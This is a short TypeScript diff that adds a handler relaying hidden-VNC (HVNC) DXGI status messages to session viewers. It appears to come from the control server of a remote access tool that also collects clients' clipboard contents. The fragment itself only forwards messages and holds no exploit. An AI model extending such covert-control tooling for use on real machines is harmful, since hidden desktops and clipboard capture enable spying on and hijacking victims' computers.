@@ -610,6 +610,17 @@ export function handleHVNCLookupResult(clientId: string, payload: any) {
   }
 }
 
+export function handleHVNCDXGIStatus(clientId: string, payload: any) {
+  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+    safeSendViewer(session.viewer, {
+      type: "hvnc_dxgi_status",
+      success: !!payload.success,
+      gpuPid: Number(payload.gpuPid) || 0,
+      message: String(payload.message || ""),
+    });
+  }
+}
+
 export function handleClipboardContent(clientId: string, payload: any) {
   const text = String(payload.text || "");
   const source = String(payload.source || "");
